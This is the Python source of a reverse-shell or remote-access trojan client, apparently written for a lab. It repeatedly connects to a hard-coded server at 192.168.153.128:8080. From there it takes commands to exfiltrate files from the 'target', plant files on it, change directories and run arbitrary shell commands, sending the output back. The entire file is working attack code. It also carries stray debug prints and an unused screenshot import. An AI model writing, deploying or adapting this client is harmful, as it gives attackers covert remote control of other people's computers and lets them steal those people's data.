import socket
import subprocess
import os
import time
import tempfile
import shutil
from PIL import ImageGrab

def initiate():
    tuneConnection()

# Initiates connection with server
def tuneConnection():
    mySocket = socket.socket()
    while True:
        time.sleep(20)
        try:
            mySocket.connect(('192.168.153.128', 8080))
            shell(mySocket)
        except:
            tuneConnection()

# Code block for transferring files to and from target
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

# Grabs desired file and sends to server
def letGrab(mySocket, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            mySocket.send(packet)
            packet = f.read(5000)
        mySocket.send('DONE'.encode())
    else:
        mySocket.send('File not found'.encode())

# Writes received file to device
def letSend(mySocket, path, fileName):
    if os.path.exists(path):
        f = open(path + fileName, 'ab')
        while True:
            bits = mySocket.recv(5000)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4]) # Forget 'DONE' string when writing
                f.close()
                break
            if 'File not found'.encode() in bits:
                break
            f.write(bits)

# Detect specific commands and run them
def shell(mySocket):
    while True:
        command = mySocket.recv(5000)

        # Terminate session
        if 'terminate' in command.decode():
            mySocket.close()
            break

        # Exfiltrate file(s) from target
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                letGrab(mySocket, path)
            except Exception as e:
                informToServer = "The shield is still up, pull up!: " + str(e)
                mySocket.send(informToServer.encode())

        # Send files to target
        elif 'send' in command.decode():
            send, path, fileName = command.decode().split(" ")
            try:
                letSend(mySocket, path, fileName)
            except Exception as e:
                informToServer = "The shield is still up, pull up! All craft pull up!: " + str(e)
                mySocket.send(informToServer.encode())

        # Check target's current or listed directory
        elif 'cd' in command.decode():
            informToServer = "Current location is " + os.getcwd()
            mySocket.send(informToServer.encode())
            try:
                print(command.decode())
                code, directory = command.decode().split(" ",1)
                print(code, directory)
                print("Hello")
                os.chdir(directory)
                print('Howdy')
                mySocket.send(informToServer.encode())
                print('Bonjour')
            except Exception as e:
                informToServer = "The deflector shield is too strong!: " + str(e)
                mySocket.send(informToServer.encode())

        # Run other commands sent/received
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            mySocket.send(CMD.stderr.read())
            mySocket.send(CMD.stdout.read())

def main():
    initiate()

main()